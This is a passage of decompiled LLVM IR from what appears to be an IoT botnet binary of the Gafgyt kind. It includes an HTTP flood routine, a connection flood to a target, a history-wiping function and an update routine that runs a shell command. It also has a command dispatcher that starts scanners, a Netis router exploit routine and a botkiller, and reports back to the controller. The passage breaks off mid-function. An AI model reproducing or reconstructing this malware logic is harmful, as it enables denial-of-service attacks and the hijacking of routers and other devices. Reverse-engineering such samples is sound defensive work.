  %v3_f0b0 = call i32 @strlen(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1b0b8.516, i32 0, i32 0))
  %v8_f0d4 = call i32 @__libc_sendto(i32 %v0_f00c, i32* bitcast ([3 x i8]* @global_var_1b0b8.516 to i32*), i32 %v3_f0b0, i32 0, i32 %v2_f058, i32 16)
  %v1_f0dc = call i32 @__libc_close(i32 %v0_f00c)
  br label %dec_label_pc_f000

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @ClearHistory(i32 %arg1) local_unnamed_addr {
entry:
  %v3_f0f0 = load i32, i32* @fp, align 4
  %v2_f0fc = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1b158.518 to i32))
  %v2_f104 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_1b170.520 to i32))
  %v2_f10c = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1b190.522 to i32))
  store i32 %v3_f0f0, i32* @fp, align 4
  ret i32 %v2_f10c
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-3152 = alloca i32, align 4
  %stack_var_-2628 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_f124 = load i32, i32* @r4, align 4
  store i32 %v3_f124, i32* %stack_var_-20, align 4
  %v6_f124 = load i32, i32* @fp, align 4
  store i32 61740, i32* %stack_var_-4, align 4
  %v16_f124 = ptrtoint i32* %stack_var_-20 to i32
  %v2_f128 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f128, i32* @fp, align 4
  %v2_f150 = ptrtoint i32* %stack_var_-2628 to i32
  store i32 ptrtoint ([649 x i8*]* @global_var_21b90.826 to i32), i32* @r1, align 4
  store i32 %v2_f150, i32* @r0, align 4
  store i32 2596, i32* @r2, align 4
  %v0_f168 = call i32 @memcpy()
  %v2_f184 = call i32 @__GI_time(i32* null)
  %v3_f18c = load i32, i32* %stack_var_0, align 4
  %v2_f190 = add i32 %v3_f18c, %v2_f184
  %v0_f198 = call i32 @random()
  %v2_f1a8 = srem i32 %v0_f198, 30
  %v3_f1bc = mul nsw i32 %v2_f1a8, 4
  %v2_f1c4 = add i32 %v3_f1bc, %v16_f124
  %v2_f1c8 = add i32 %v2_f1c4, -2620
  %v1_f1cc = inttoptr i32 %v2_f1c8 to i32*
  %v2_f1cc = load i32, i32* %v1_f1cc, align 4
  store i32 %v2_f1cc, i32* @r4, align 4
  %v0_f1d0 = call i32 @random()
  %v2_f1e4 = srem i32 %v0_f1d0, 674
  %v3_f1f8 = mul nsw i32 %v2_f1e4, 4
  %v2_f200 = add i32 %v3_f1f8, %v16_f124
  %v2_f204 = add i32 %v2_f200, -2608
  %v1_f208 = inttoptr i32 %v2_f204 to i32*
  %v2_f208 = load i32, i32* %v1_f208, align 4
  %v2_f210 = ptrtoint i32* %stack_var_-3152 to i32
  %v0_f214 = load i32, i32* @r4, align 4
  store i32 %v2_f210, i32* @r0, align 4
  %v7_f22c = call i32 @sprintf(i32 %v2_f210, i32 ptrtoint ([62 x i8]* @global_var_225b4.835 to i32), i32 %arg2, i32 %arg4, i32 %v0_f214, i32 %v2_f208)
  br label %dec_label_pc_f2e4

dec_label_pc_f23c:                                ; preds = %dec_label_pc_f2e4
  %v0_f23c = call i32 @__libc_fork()
  %v2_f244 = icmp eq i32 %v0_f23c, 0
  %v1_f2dc = add nuw i32 %storemerge2, 1
  br i1 %v2_f244, label %dec_label_pc_f2e4, label %dec_label_pc_f2b8.preheader

dec_label_pc_f2b8.preheader:                      ; preds = %dec_label_pc_f23c
  %tmp28 = bitcast i32* %stack_var_-3152 to i8*
  br label %dec_label_pc_f2b8

dec_label_pc_f250:                                ; preds = %dec_label_pc_f2b8
  %v5_f270 = call i32 @socket_connect(i32 %arg1, i8 %arg3, i32 %tmp)
  %v2_f280 = icmp eq i32 %v5_f270, 0
  br i1 %v2_f280, label %dec_label_pc_f2b8, label %dec_label_pc_f288

dec_label_pc_f288:                                ; preds = %dec_label_pc_f250
  %v3_f294 = call i32 @strlen(i8* %tmp28)
  store i32 %v3_f294, i32* @r2, align 4
  %v3_f2ac = call i32 @__libc_write(i32 %v5_f270, i32* nonnull %stack_var_-3152)
  %v1_f2b4 = call i32 @__libc_close(i32 %v5_f270)
  br label %dec_label_pc_f2b8

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f250, %dec_label_pc_f288, %dec_label_pc_f2b8.preheader
  %v2_f2bc = call i32 @__GI_time(i32* null)
  %v5_f2cc = icmp slt i32 %v2_f2bc, %v2_f190
  br i1 %v5_f2cc, label %dec_label_pc_f250, label %dec_label_pc_f2d0

dec_label_pc_f2d0:                                ; preds = %dec_label_pc_f2b8
  %v1_f2d4 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_f2e4:                                ; preds = %dec_label_pc_f23c, %entry
  %v12_f2f8 = phi i32 [ %v7_f22c, %entry ], [ 0, %dec_label_pc_f23c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_f2dc, %dec_label_pc_f23c ]
  %v5_f2f0 = icmp slt i32 %storemerge2, %arg6
  br i1 %v5_f2f0, label %dec_label_pc_f23c, label %dec_label_pc_f2f4

dec_label_pc_f2f4:                                ; preds = %dec_label_pc_f2e4
  %v2_f2f8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f2f8, i32* @r4, align 4
  store i32 %v6_f124, i32* @fp, align 4
  ret i32 %v12_f2f8

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %v5_f270, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_f2b8, { 1, 0, 2 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_f328 = call i32 @__GI_time(i32* null)
  %v2_f334 = add i32 %v2_f328, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_f344 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_f368 = urem i32 %arg2, 65536
  %v1_f370 = call i32 @htons(i32 %v3_f368)
  %v3_f3b0 = bitcast i32* %stack_var_-40 to %sockaddr*
  br label %dec_label_pc_f3c4

dec_label_pc_f388:                                ; preds = %dec_label_pc_f3c4
  %v0_f394 = call i32 @socket()
  %v4_f3b0 = call i32 @__libc_connect(i32 %v0_f394, %sockaddr* %v3_f3b0, i32 16)
  %v1_f3b8 = call i32 @sleep(i32 1)
  %v1_f3c0 = call i32 @__libc_close(i32 %v0_f394)
  br label %dec_label_pc_f3c4

dec_label_pc_f3c4:                                ; preds = %entry, %dec_label_pc_f388
  %v2_f3c8 = call i32 @__GI_time(i32* null)
  %v5_f3d8 = icmp slt i32 %v2_f3c8, %v2_f334
  br i1 %v5_f3d8, label %dec_label_pc_f388, label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f3c4
  ret i32 %v2_f3c8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_f3c4, { 1, 0 }
}

define i32 @UpdateBins(i32 %arg1) local_unnamed_addr {
entry:
  %v0_f3f4 = call i32 @__libc_fork()
  %v2_f404 = icmp eq i32 %v0_f3f4, 0
  br i1 %v2_f404, label %dec_label_pc_f40c, label %dec_label_pc_f420

dec_label_pc_f40c:                                ; preds = %entry
  %v2_f410 = call i32 @__libc_system(i32 ptrtoint ([443 x i8]* @global_var_225f4.837 to i32))
  %v1_f418 = call i32 @sleep(i32 20)
  br label %dec_label_pc_f42c

dec_label_pc_f420:                                ; preds = %entry
  %v4_f428 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_227b0.839, i32 0, i32 0), i32 %v0_f3f4)
  br label %dec_label_pc_f42c

dec_label_pc_f42c:                                ; preds = %dec_label_pc_f40c, %dec_label_pc_f420
  %storemerge = phi i32 [ %v4_f428, %dec_label_pc_f420 ], [ %v1_f418, %dec_label_pc_f40c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_f42c, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_f438 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f438, i32* @ip, align 4
  %v3_f43c = load i32, i32* @r4, align 4
  %v6_f43c = load i32, i32* @r5, align 4
  %v9_f43c = load i32, i32* @r6, align 4
  %v12_f43c = load i32, i32* @r7, align 4
  %v15_f43c = load i32, i32* @r8, align 4
  %v18_f43c = load i32, i32* @fp, align 4
  store i32 62532, i32* %stack_var_-4, align 4
  %v2_f440 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f440, i32* @fp, align 4
  %v2_f454 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_227b4.841 to i32), i32* @r1, align 4
  %v3_f460 = inttoptr i32 %v2_f454 to i8*
  %v4_f460 = call i32 @__GI_strcoll(i8* %v3_f460, i32 ptrtoint ([7 x i8]* @global_var_227b4.841 to i32))
  %v2_f468 = icmp eq i32 %v4_f460, 0
  br i1 %v2_f468, label %dec_label_pc_f470, label %dec_label_pc_f580

dec_label_pc_f470:                                ; preds = %entry
  %v1_f474 = add i32 %tmp, 4
  %v1_f478 = inttoptr i32 %v1_f474 to i32*
  %v2_f478 = load i32, i32* %v1_f478, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_227bc.843 to i32), i32* @r1, align 4
  %v3_f484 = inttoptr i32 %v2_f478 to i8*
  %v4_f484 = call i32 @__GI_strcoll(i8* %v3_f484, i32 ptrtoint ([8 x i8]* @global_var_227bc.843 to i32))
  %v2_f48c = icmp eq i32 %v4_f484, 0
  br i1 %v2_f48c, label %dec_label_pc_f494, label %dec_label_pc_f4b4

dec_label_pc_f494:                                ; preds = %dec_label_pc_f470
  %v2_f498 = call i32 @__libc_system(i32 ptrtoint ([131 x i8]* @global_var_227c4.845 to i32))
  %v1_f49c = call i32 @ClearHistory(i32 %v2_f498)
  %v2_f4a4 = load i32, i32* @global_var_2c908.54, align 4
  %v3_f4b0 = call i32 @sockprintf(i32 %v2_f4a4, i32 ptrtoint ([26 x i8]* @global_var_22848.848 to i32))
  br label %dec_label_pc_f4b4

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f470, %dec_label_pc_f494
  %v2_f4bc = load i32, i32* %v1_f478, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_22864.850 to i32), i32* @r1, align 4
  %v3_f4c8 = inttoptr i32 %v2_f4bc to i8*
  %v4_f4c8 = call i32 @__GI_strcoll(i8* %v3_f4c8, i32 ptrtoint ([7 x i8]* @global_var_22864.850 to i32))
  %v2_f4d0 = icmp eq i32 %v4_f4c8, 0
  br i1 %v2_f4d0, label %dec_label_pc_f4d8, label %dec_label_pc_f4f8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f4b4
  %v2_f4dc = call i32 @__libc_system(i32 ptrtoint ([48 x i8]* @global_var_2286c.852 to i32))
  %v1_f4e0 = call i32 @ClearHistory(i32 %v2_f4dc)
  %v2_f4e8 = load i32, i32* @global_var_2c908.54, align 4
  %v3_f4f4 = call i32 @sockprintf(i32 %v2_f4e8, i32 ptrtoint ([24 x i8]* @global_var_2289c.854 to i32))
  br label %dec_label_pc_f4f8

dec_label_pc_f4f8:                                ; preds = %dec_label_pc_f4b4, %dec_label_pc_f4d8
  %v2_f500 = load i32, i32* %v1_f478, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_228b4.856 to i32), i32* @r1, align 4
  %v3_f50c = inttoptr i32 %v2_f500 to i8*
  %v4_f50c = call i32 @__GI_strcoll(i8* %v3_f50c, i32 ptrtoint ([4 x i8]* @global_var_228b4.856 to i32))
  %v2_f514 = icmp eq i32 %v4_f50c, 0
  br i1 %v2_f514, label %dec_label_pc_f51c, label %dec_label_pc_f53c

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f4f8
  %v2_f520 = call i32 @__libc_system(i32 ptrtoint ([31 x i8]* @global_var_228b8.858 to i32))
  %v1_f524 = call i32 @ClearHistory(i32 %v2_f520)
  %v2_f52c = load i32, i32* @global_var_2c908.54, align 4
  %v3_f538 = call i32 @sockprintf(i32 %v2_f52c, i32 ptrtoint ([24 x i8]* @global_var_228d8.860 to i32))
  br label %dec_label_pc_f53c

dec_label_pc_f53c:                                ; preds = %dec_label_pc_f4f8, %dec_label_pc_f51c
  %v2_f544 = load i32, i32* %v1_f478, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_228f0.862 to i32), i32* @r1, align 4
  %v3_f550 = inttoptr i32 %v2_f544 to i8*
  %v4_f550 = call i32 @__GI_strcoll(i8* %v3_f550, i32 ptrtoint ([6 x i8]* @global_var_228f0.862 to i32))
  %v2_f558 = icmp eq i32 %v4_f550, 0
  br i1 %v2_f558, label %dec_label_pc_f560, label %dec_label_pc_f580

dec_label_pc_f560:                                ; preds = %dec_label_pc_f53c
  %v2_f564 = call i32 @__libc_system(i32 ptrtoint ([40 x i8]* @global_var_228f8.864 to i32))
  %v1_f568 = call i32 @ClearHistory(i32 %v2_f564)
  %v2_f570 = load i32, i32* @global_var_2c908.54, align 4
  %v3_f57c = call i32 @sockprintf(i32 %v2_f570, i32 ptrtoint ([28 x i8]* @global_var_22920.866 to i32))
  br label %dec_label_pc_f580

dec_label_pc_f580:                                ; preds = %dec_label_pc_f53c, %entry, %dec_label_pc_f560
  %v2_f584 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a708.56 to i32), i32* @r1, align 4
  %v3_f590 = inttoptr i32 %v2_f584 to i8*
  %v4_f590 = call i32 @__GI_strcoll(i8* %v3_f590, i32 ptrtoint ([5 x i8]* @global_var_1a708.56 to i32))
  %v2_f598 = icmp eq i32 %v4_f590, 0
  br i1 %v2_f598, label %dec_label_pc_f5a0, label %dec_label_pc_f5b8

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f580
  %v2_f5a4 = load i32, i32* @global_var_2c908.54, align 4
  %v3_f5b0 = call i32 @sockprintf(i32 %v2_f5a4, i32 ptrtoint ([6 x i8]* @global_var_2293c.869 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_f5b8:                                ; preds = %dec_label_pc_f580
  %v2_f5bc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_22944.871 to i32), i32* @r1, align 4
  %v3_f5c8 = inttoptr i32 %v2_f5bc to i8*
  %v4_f5c8 = call i32 @__GI_strcoll(i8* %v3_f5c8, i32 ptrtoint ([6 x i8]* @global_var_22944.871 to i32))
  %v2_f5d0 = icmp eq i32 %v4_f5c8, 0
  br i1 %v2_f5d0, label %dec_label_pc_f5d8, label %dec_label_pc_f5fc

dec_label_pc_f5d8:                                ; preds = %dec_label_pc_f5b8
  %v2_f5dc = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_f5dc, i32* @r4, align 4
  %v0_f5e0 = call i32 @getdtablesize()
  %v0_f5e8 = load i32, i32* @r4, align 4
  store i32 %v0_f5e0, i32* @r2, align 4
  %v3_f5f4 = call i32 @sockprintf(i32 %v0_f5e8, i32 ptrtoint ([3 x i8]* @global_var_2294c.873 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_f5fc:                                ; preds = %dec_label_pc_f5b8
  %v2_f600 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_22864.850 to i32), i32* @r1, align 4
  %v3_f60c = inttoptr i32 %v2_f600 to i8*
  %v4_f60c = call i32 @__GI_strcoll(i8* %v3_f60c, i32 ptrtoint ([7 x i8]* @global_var_22864.850 to i32))
  %v2_f614 = icmp eq i32 %v4_f60c, 0
  br i1 %v2_f614, label %dec_label_pc_f61c, label %dec_label_pc_f63c

dec_label_pc_f61c:                                ; preds = %dec_label_pc_f5fc
  %v2_f620 = load i32, i32* @global_var_2c908.54, align 4
  %v3_f62c = call i32 @sockprintf(i32 %v2_f620, i32 ptrtoint ([25 x i8]* @global_var_22950.875 to i32))
  %v1_f634 = call i32 @UpdateBins(i32 1)
  br label %dec_label_pc_1070c

dec_label_pc_f63c:                                ; preds = %dec_label_pc_f5fc
  %v2_f640 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_2296c.877 to i32), i32* @r1, align 4
  %v3_f64c = inttoptr i32 %v2_f640 to i8*
  %v4_f64c = call i32 @__GI_strcoll(i8* %v3_f64c, i32 ptrtoint ([8 x i8]* @global_var_2296c.877 to i32))
  %v2_f654 = icmp eq i32 %v4_f64c, 0
  br i1 %v2_f654, label %dec_label_pc_f65c, label %dec_label_pc_f778

dec_label_pc_f65c:                                ; preds = %dec_label_pc_f63c
  %v1_f660 = add i32 %tmp, 4
  %v1_f664 = inttoptr i32 %v1_f660 to i32*
  %v2_f664 = load i32, i32* %v1_f664, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_228b4.856 to i32), i32* @r1, align 4
  %v3_f670 = inttoptr i32 %v2_f664 to i8*
  %v4_f670 = call i32 @__GI_strcoll(i8* %v3_f670, i32 ptrtoint ([4 x i8]* @global_var_228b4.856 to i32))
  %v2_f678 = icmp eq i32 %v4_f670, 0
  br i1 %v2_f678, label %dec_label_pc_f680, label %dec_label_pc_f6c4

dec_label_pc_f680:                                ; preds = %dec_label_pc_f65c
  %v2_f684 = load i32, i32* @global_var_32b8c.879, align 4
  %v2_f688 = icmp eq i32 %v2_f684, 0
  br i1 %v2_f688, label %dec_label_pc_1070c, label %dec_label_pc_f690

dec_label_pc_f690:                                ; preds = %dec_label_pc_f680
  %v0_f6a0 = call i32 @kill()
  %v2_f6a8 = load i32, i32* @global_var_2c908.54, align 4
  %v3_f6b4 = call i32 @sockprintf(i32 %v2_f6a8, i32 ptrtoint ([17 x i8]* @global_var_22974.881 to i32))
  store i32 0, i32* @global_var_32b8c.879, align 4
  br label %dec_label_pc_f6c4

dec_label_pc_f6c4:                                ; preds = %dec_label_pc_f65c, %dec_label_pc_f690
  %v2_f6cc = load i32, i32* %v1_f664, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_22988.883 to i32), i32* @r1, align 4
  %v3_f6d8 = inttoptr i32 %v2_f6cc to i8*
  %v4_f6d8 = call i32 @__GI_strcoll(i8* %v3_f6d8, i32 ptrtoint ([3 x i8]* @global_var_22988.883 to i32))
  %v2_f6e0 = icmp eq i32 %v4_f6d8, 0
  br i1 %v2_f6e0, label %dec_label_pc_f6e8, label %dec_label_pc_f778

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f6c4
  %v2_f6ec = load i32, i32* @global_var_32b8c.879, align 4
  %v2_f6f0 = icmp eq i32 %v2_f6ec, 0
  br i1 %v2_f6f0, label %dec_label_pc_f6f8, label %dec_label_pc_1070c

dec_label_pc_f6f8:                                ; preds = %dec_label_pc_f6e8
  %v0_f6f8 = call i32 @__libc_fork()
  %v2_f718 = icmp eq i32 %v0_f6f8, 0
  br i1 %v2_f718, label %dec_label_pc_f73c, label %dec_label_pc_f720

dec_label_pc_f720:                                ; preds = %dec_label_pc_f6f8
  store i32 %v0_f6f8, i32* @global_var_32b8c.879, align 4
  br label %dec_label_pc_1070c

dec_label_pc_f73c:                                ; preds = %dec_label_pc_f6f8
  %v2_f740 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_f740, i32* @r4, align 4
  %v2_f748 = load i32, i32* @global_var_32b84.316, align 4
  store i32 %v2_f748, i32* @r0, align 4
  %v1_f74c = call i32 @__GI_inet_ntoa(i32 %v2_f748)
  %v0_f754 = load i32, i32* @r4, align 4
  store i32 %v1_f74c, i32* @r2, align 4
  %v3_f760 = call i32 @sockprintf(i32 %v0_f754, i32 ptrtoint ([26 x i8]* @global_var_2298c.886 to i32))
  %v2_f76c = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_f774 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_f778:                                ; preds = %dec_label_pc_f6c4, %dec_label_pc_f63c
  %v2_f77c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_229a8.888 to i32), i32* @r1, align 4
  %v3_f788 = inttoptr i32 %v2_f77c to i8*
  %v4_f788 = call i32 @__GI_strcoll(i8* %v3_f788, i32 ptrtoint ([6 x i8]* @global_var_229a8.888 to i32))
  %v2_f790 = icmp eq i32 %v4_f788, 0
  br i1 %v2_f790, label %dec_label_pc_f798, label %dec_label_pc_f8b0

dec_label_pc_f798:                                ; preds = %dec_label_pc_f778
  %v1_f79c = add i32 %tmp, 4
  %v1_f7a0 = inttoptr i32 %v1_f79c to i32*
  %v2_f7a0 = load i32, i32* %v1_f7a0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_228b4.856 to i32), i32* @r1, align 4
  %v3_f7ac = inttoptr i32 %v2_f7a0 to i8*
  %v4_f7ac = call i32 @__GI_strcoll(i8* %v3_f7ac, i32 ptrtoint ([4 x i8]* @global_var_228b4.856 to i32))
  %v2_f7b4 = icmp eq i32 %v4_f7ac, 0
  br i1 %v2_f7b4, label %dec_label_pc_f7bc, label %dec_label_pc_f814

dec_label_pc_f7bc:                                ; preds = %dec_label_pc_f798
  %v2_f7c0 = load i32, i32* @global_var_32b8c.879, align 4
  %v2_f7c4 = icmp eq i32 %v2_f7c0, 0
  br i1 %v2_f7c4, label %dec_label_pc_1070c, label %dec_label_pc_f7cc

dec_label_pc_f7cc:                                ; preds = %dec_label_pc_f7bc
  %v0_f7dc = call i32 @kill()
  %v2_f7e4 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_f7e4, i32* @r4, align 4
  %v2_f7ec = load i32, i32* @global_var_32b84.316, align 4
  store i32 %v2_f7ec, i32* @r0, align 4
  %v1_f7f0 = call i32 @__GI_inet_ntoa(i32 %v2_f7ec)
  %v0_f7f8 = load i32, i32* @r4, align 4
  store i32 %v1_f7f0, i32* @r2, align 4
  %v3_f804 = call i32 @sockprintf(i32 %v0_f7f8, i32 ptrtoint ([23 x i8]* @global_var_229b0.890 to i32))
  store i32 0, i32* @global_var_32b8c.879, align 4
  br label %dec_label_pc_f814

dec_label_pc_f814:                                ; preds = %dec_label_pc_f798, %dec_label_pc_f7cc
  %v2_f81c = load i32, i32* %v1_f7a0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_22988.883 to i32), i32* @r1, align 4
  %v3_f828 = inttoptr i32 %v2_f81c to i8*
  %v4_f828 = call i32 @__GI_strcoll(i8* %v3_f828, i32 ptrtoint ([3 x i8]* @global_var_22988.883 to i32))
  %v2_f830 = icmp eq i32 %v4_f828, 0
  br i1 %v2_f830, label %dec_label_pc_f838, label %dec_label_pc_f8b0

dec_label_pc_f838:                                ; preds = %dec_label_pc_f814
  %v2_f83c = load i32, i32* @global_var_32b8c.879, align 4
  %v2_f840 = icmp eq i32 %v2_f83c, 0
  br i1 %v2_f840, label %dec_label_pc_f848, label %dec_label_pc_1070c

dec_label_pc_f848:                                ; preds = %dec_label_pc_f838
  %v0_f848 = call i32 @__libc_fork()
  %v2_f858 = icmp eq i32 %v0_f848, 0
  br i1 %v2_f858, label %dec_label_pc_f87c, label %dec_label_pc_f860

dec_label_pc_f860:                                ; preds = %dec_label_pc_f848
  store i32 %v0_f848, i32* @global_var_32b8c.879, align 4
  br label %dec_label_pc_1070c

dec_label_pc_f87c:                                ; preds = %dec_label_pc_f848
  %v2_f880 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_f880, i32* @r4, align 4
  %v2_f888 = load i32, i32* @global_var_32b84.316, align 4
  store i32 %v2_f888, i32* @r0, align 4
  %v1_f88c = call i32 @__GI_inet_ntoa(i32 %v2_f888)
  %v0_f894 = load i32, i32* @r4, align 4
  store i32 %v1_f88c, i32* @r2, align 4
  %v3_f8a0 = call i32 @sockprintf(i32 %v0_f894, i32 ptrtoint ([23 x i8]* @global_var_229c8.892 to i32))
  %v1_f8a4 = call i32 @NetisScanner(i32 %v3_f8a0)
  %v1_f8ac = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_f8b0:                                ; preds = %dec_label_pc_f814, %dec_label_pc_f778
  %v2_f8b4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_229e0.894 to i32), i32* @r1, align 4
  %v3_f8c0 = inttoptr i32 %v2_f8b4 to i8*
  %v4_f8c0 = call i32 @__GI_strcoll(i8* %v3_f8c0, i32 ptrtoint ([8 x i8]* @global_var_229e0.894 to i32))
  %v2_f8c8 = icmp eq i32 %v4_f8c0, 0
  br i1 %v2_f8c8, label %dec_label_pc_f8d0, label %dec_label_pc_f914

dec_label_pc_f8d0:                                ; preds = %dec_label_pc_f8b0
  %v0_f8d0 = call i32 @listFork()
  %v2_f8d8 = icmp eq i32 %v0_f8d0, 0
  br i1 %v2_f8d8, label %dec_label_pc_f8e0, label %dec_label_pc_f914

dec_label_pc_f8e0:                                ; preds = %dec_label_pc_f8d0
  %v2_f8e4 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_f8e4, i32* @r4, align 4
  %v2_f8ec = load i32, i32* @global_var_32b84.316, align 4
  store i32 %v2_f8ec, i32* @r0, align 4
  %v1_f8f0 = call i32 @__GI_inet_ntoa(i32 %v2_f8ec)
  %v0_f8f8 = load i32, i32* @r4, align 4
  store i32 %v1_f8f0, i32* @r2, align 4
  %v3_f904 = call i32 @sockprintf(i32 %v0_f8f8, i32 ptrtoint ([29 x i8]* @global_var_229e8.896 to i32))
  %v1_f908 = call i32 @botkiller(i32 %v3_f904)
  %v1_f910 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_f914:                                ; preds = %dec_label_pc_f8d0, %dec_label_pc_f8b0
  %v2_f918 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_22a08.898 to i32), i32* @r1, align 4
  %v3_f924 = inttoptr i32 %v2_f918 to i8*
  %v4_f924 = call i32 @__GI_strcoll(i8* %v3_f924, i32 ptrtoint ([12 x i8]* @global_var_22a08.898 to i32))
  %v2_f92c = icmp eq i32 %v4_f924, 0
  br i1 %v2_f92c, label %dec_label_pc_f934, label %dec_label_pc_f960

dec_label_pc_f934:                                ; preds = %dec_label_pc_f914
  %v2_f938 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_f938, i32* @r4, align 4
  %v2_f940 = load i32, i32* @global_var_32b84.316, align 4
  store i32 %v2_f940, i32* @r0, align 4
  %v1_f944 = call i32 @__GI_inet_ntoa(i32 %v2_f940)
  %v0_f94c = load i32, i32* @r4, align 4
  store i32 %v1_f944, i32* @r2, align 4
  %v3_f958 = call i32 @sockprintf(i32 %v0_f94c, i32 ptrtoint ([17 x i8]* @global_var_22a14.900 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_f960:                                ; preds = %dec_label_pc_f914
  %v2_f964 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_22a28.902 to i32), i32* @r1, align 4
  %v3_f970 = inttoptr i32 %v2_f964 to i8*
  %v4_f970 = call i32 @__GI_strcoll(i8* %v3_f970, i32 ptrtoint ([4 x i8]* @global_var_22a28.902 to i32))
  %v2_f978 = icmp eq i32 %v4_f970, 0
  br i1 %v2_f978, label %dec_label_pc_f980, label %dec_label_pc_fce0

dec_label_pc_f980:                                ; preds = %dec_label_pc_f960
  %v7_f988 = icmp slt i32 %arg1, 6
  br i1 %v7_f988, label %dec_label_pc_faa0, label %dec_label_pc_f98c

dec_label_pc_f98c:                                ; preds = %dec_label_pc_f980
  %v1_f990 = add i32 %tmp, 12
  %v1_f994 = inttoptr i32 %v1_f990 to i32*
  %v2_f994 = load i32, i32* %v1_f994, align 4
  store i32 %v2_f994, i32* @r0, align 4
  %v1_f99c = call i32 @atol(i32 %v2_f994)
  %v7_f9a4 = icmp eq i32 %v1_f99c, -1
  br i1 %v7_f9a4, label %dec_label_pc_faa0, label %dec_label_pc_f9ac

dec_label_pc_f9ac:                                ; preds = %dec_label_pc_f98c
  %v1_f9b0 = add i32 %tmp, 8
  %v1_f9b4 = inttoptr i32 %v1_f9b0 to i32*
  %v2_f9b4 = load i32, i32* %v1_f9b4, align 4
  store i32 %v2_f9b4, i32* @r0, align 4
  %v1_f9bc = call i32 @atol(i32 %v2_f9b4)
  %v7_f9c4 = icmp eq i32 %v1_f9bc, -1
  br i1 %v7_f9c4, label %dec_label_pc_faa0, label %dec_label_pc_f9cc

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f9ac
  %v1_f9d0 = add i32 %tmp, 16
  %v1_f9d4 = inttoptr i32 %v1_f9d0 to i32*
  %v2_f9d4 = load i32, i32* %v1_f9d4, align 4
  store i32 %v2_f9d4, i32* @r0, align 4
  %v1_f9dc = call i32 @atol(i32 %v2_f9d4)
  %v7_f9e4 = icmp eq i32 %v1_f9dc, -1
  br i1 %v7_f9e4, label %dec_label_pc_faa0, label %dec_label_pc_f9ec

dec_label_pc_f9ec:                                ; preds = %dec_label_pc_f9cc
  %v1_f9f0 = add i32 %tmp, 20
